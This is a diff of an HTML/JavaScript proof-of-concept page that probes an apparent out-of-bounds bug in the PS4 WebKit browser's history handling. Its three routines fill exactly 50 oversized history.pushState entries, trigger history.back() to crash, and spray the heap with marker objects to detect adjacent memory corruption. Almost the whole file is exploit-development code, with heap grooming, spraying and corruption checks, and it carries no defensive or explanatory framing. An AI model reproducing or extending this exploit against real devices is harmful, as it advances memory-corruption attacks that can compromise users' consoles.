@@ -2,13 +2,14 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Reentry Path</title>
+<title>PS4 WebKit – Array OOB Exploitation</title>
 
 </head>
 <body>
-<h2>PS4 WebKit – Reentry Exploitation Path</h2>
-<button onclick="runBaseline()">BASELINE – Normal (crash at ITER 48)</button>
-<button onclick="runReentry()">OPTION D – REENTRY (expected different behavior)</button>
+<h2>PS4 WebKit – Array OOB in HistoryController</h2>
+<button onclick="runBaseline()">BASELINE – Confirm 50-entry threshold crash</button>
+<button onclick="runControlled()">OPTION E – Controlled 50 entries</button>
+<button onclick="runSprayed()">OPTION F – Spray adjacent slots</button>
 <div id="log"></div>
 
 <script>
@@ -23,117 +24,180 @@ function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 const BASE = 977;
 const STEP = 14461;
-const CRITICAL_ITER = 50; // Known crash point
+const MAGIC_THRESHOLD = 50; // Confirmed: crash requires exactly 50 entries
 
-// Grooming
 let heap = [];
-
-// Popstate observer
 let popstateCount = 0;
+
 window.addEventListener("popstate", (e) => {
   popstateCount++;
-  log(`[POPSTATE #${popstateCount}] state=${JSON.stringify(e.state)?.slice(0,50)}`, "success");
+  log(`[POPSTATE #${popstateCount}] state=${JSON.stringify(e.state)?.slice(0,60)}`, "success");
 });
 
 // -------------------------------------------------
-// BASELINE – Reproduce known crash
+// BASELINE – Reproduce with correct understanding
 // -------------------------------------------------
 async function runBaseline(){
   logEl.textContent = "";
-  popstateCount = 0;
   heap = [];
-  log("=== BASELINE START ===");
-  log("Expected crash at ITER 48");
+  popstateCount = 0;
+  
+  log("=== BASELINE – 50 Entry Threshold Test ===");
+  log(`Target: ${MAGIC_THRESHOLD} entries → crash on back()`, "critical");
   
   let size = BASE;
-  for(let i=0; i<50; i++){
+  for(let i=0; i<MAGIC_THRESHOLD; i++){
     heap.push("G".repeat(32768));
     const fragment = "A".repeat(size);
     
-    log(`[ITER ${i}] size=${size}`);
+    log(`[ENTRY ${i}/${MAGIC_THRESHOLD}] size=${size}`);
+    history.pushState({index:i, marker:"baseline"}, "", "#"+fragment);
     
-    history.pushState({iter:i}, "", "#"+fragment);
-    history.replaceState({iter:i}, "", "#"+fragment);
-    
-    if(i % 6 === 0){
+    if(i % 6 === 0 && i > 0){
       setTimeout(()=>history.back(), 0);
-      log("  → back() scheduled");
+      log("  → back() scheduled", "warn");
     }
     
     size += STEP;
     await sleep(3);
   }
   
-  log("=== BASELINE END (if reached) ===");
-}
-
-// -------------------------------------------------
-// OPTION D – REENTRY PATH
-// -------------------------------------------------
-async function runReentry(){
-  logEl.textContent = "";
-  popstateCount = 0;
-  heap = [];
-  log("=== OPTION D – REENTRY START ===", "critical");
-  log("Strategy: Force HistoryItem reuse during invalidation");
-  
-  let size = BASE;
-  
-  // Phase 1: Build up to critical point (ITER 47)
-  for(let i=0; i<CRITICAL_ITER-1; i++){
-    heap.push("G".repeat(32768));
-    const fragment = "A".repeat(size);
-    
-    log(`[BUILD ${i}] size=${size}`);
-    history.pushState({phase:"build", iter:i}, "", "#"+fragment);
-    
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(), 0);
-    }
-    
-    size += STEP;
-    await sleep(3);
-  }
-  
-  log(">>> ENTERING REENTRY SEQUENCE <<<", "critical");
-  await sleep(50); // Let pending backs settle
-  
-  // Phase 2: REENTRY SEQUENCE at critical size
-  const criticalSize = BASE + STEP * (CRITICAL_ITER-1);
-  const fragment1 = "X".repeat(criticalSize);
-  const fragment2 = "Y".repeat(criticalSize);
-  
-  log(`[REENTRY] Step 1: pushState (X×${criticalSize})`);
-  history.pushState({phase:"reentry", step:1}, "", "#"+fragment1);
-  
-  log(`[REENTRY] Step 2: schedule back()`);
-  setTimeout(() => {
-    log("  → back() EXECUTING", "critical");
-    history.back();
-  }, 0);
-  
-  await sleep(5); // Minimal delay
-  
-  log(`[REENTRY] Step 3: IMMEDIATE pushState (Y×${criticalSize})`, "critical");
-  history.pushState({phase:"reentry", step:3}, "", "#"+fragment2);
-  
+  log(`>>> 50 ENTRIES REACHED <<<`, "critical");
   await sleep(100);
   
-  log(">>> POST-REENTRY OBSERVATION <<<", "success");
-  log(`Popstate events received: ${popstateCount}`);
-  log(`Current fragment length: ${location.hash.length}`);
-  log(`Current fragment first char: ${location.hash[1] || 'none'}`);
+  log(`[TRIGGER] Executing back() on entry 50`, "critical");
+  history.back(); // This should crash
   
-  // Phase 3: Trigger with another back
-  log(`[TRIGGER] Final back() to observe behavior`, "critical");
-  await sleep(50);
-  history.back();
-  
-  await sleep(200);
-  log("=== OPTION D END (if reached) ===");
+  await sleep(500);
+  log("=== BASELINE END (should not reach) ===");
 }
 
-log("Ready. Run BASELINE first to confirm crash, then OPTION D.");
+// -------------------------------------------------
+// OPTION E – Controlled entries to probe OOB
+// -------------------------------------------------
+async function runControlled(){
+  logEl.textContent = "";
+  heap = [];
+  popstateCount = 0;
+  
+  log("=== OPTION E – Controlled Entries ===", "critical");
+  log("Strategy: Fill 50 slots with distinct patterns");
+  
+  // Phase 1: Fill first 48 with small, controlled data
+  log("\n[PHASE 1] Filling entries 0-47 with controlled data");
+  for(let i=0; i<48; i++){
+    const marker = String.fromCharCode(65 + (i % 26)); // A-Z pattern
+    const fragment = marker.repeat(100); // Small, predictable
+    
+    history.pushState({
+      index: i,
+      marker: marker,
+      phase: "controlled"
+    }, "", "#"+fragment);
+    
+    if(i % 10 === 0) log(`  Entry ${i}: ${marker}×100`);
+    await sleep(2);
+  }
+  
+  // Phase 2: Entry 48-49 with large payloads
+  log("\n[PHASE 2] Entries 48-49 with large payloads", "warn");
+  
+  const size48 = BASE + STEP * 48;
+  history.pushState({
+    index: 48,
+    marker: "CRITICAL_48",
+    size: size48
+  }, "", "#"+"X".repeat(size48));
+  log(`  Entry 48: X×${size48}`);
+  
+  await sleep(5);
+  
+  const size49 = BASE + STEP * 49;
+  history.pushState({
+    index: 49,
+    marker: "CRITICAL_49",
+    size: size49
+  }, "", "#"+"Y".repeat(size49));
+  log(`  Entry 49: Y×${size49}`);
+  
+  log(`\n>>> 50 ENTRIES REACHED <<<`, "critical");
+  await sleep(100);
+  
+  // Trigger
+  log(`[TRIGGER] Executing back()`, "critical");
+  history.back();
+  
+  await sleep(500);
+  log(`\nPopstate count: ${popstateCount}`);
+  log(`Current hash: ${location.hash.slice(0,50)}...`);
+  log("=== OPTION E END ===");
+}
+
+// -------------------------------------------------
+// OPTION F – Heap spray adjacent to history array
+// -------------------------------------------------
+async function runSprayed(){
+  logEl.textContent = "";
+  heap = [];
+  popstateCount = 0;
+  
+  log("=== OPTION F – Adjacent Slot Spray ===", "critical");
+  log("Strategy: Spray heap before filling history");
+  
+  // Spray phase
+  log("\n[SPRAY] Creating adjacent objects");
+  const SPRAY_COUNT = 1000;
+  const spray = [];
+  for(let i=0; i<SPRAY_COUNT; i++){
+    spray.push({
+      id: i,
+      marker: "SPRAY",
+      data: "Z".repeat(1024)
+    });
+  }
+  log(`  Created ${SPRAY_COUNT} spray objects`);
+  
+  // Small delay to let allocator settle
+  await sleep(50);
+  
+  // Fill history
+  log("\n[FILL] Populating 50 history entries");
+  let size = BASE;
+  for(let i=0; i<MAGIC_THRESHOLD; i++){
+    const fragment = "H".repeat(size);
+    history.pushState({index:i, marker:"spray_test"}, "", "#"+fragment);
+    
+    if(i % 10 === 0) log(`  Entry ${i}/${MAGIC_THRESHOLD}`);
+    
+    size += STEP;
+    await sleep(2);
+  }
+  
+  log(`\n>>> 50 ENTRIES + SPRAY <<<`, "critical");
+  await sleep(100);
+  
+  // Trigger
+  log(`[TRIGGER] back() with spray objects adjacent`, "critical");
+  history.back();
+  
+  await sleep(500);
+  
+  // Check for corruption
+  log(`\n[CHECK] Spray object integrity:`);
+  let corrupted = 0;
+  for(let i=0; i<100; i++){
+    if(spray[i].marker !== "SPRAY"){
+      corrupted++;
+      log(`  Object ${i} CORRUPTED: ${spray[i].marker}`, "critical");
+    }
+  }
+  log(`  Corrupted: ${corrupted}/100`);
+  
+  log("=== OPTION F END ===");
+}
+
+log("Ready. Understanding: Bug requires EXACTLY 50 history entries.");
+log("Run BASELINE to confirm, then E and F to probe exploitation.");
 </script>
 </body>
 </html>
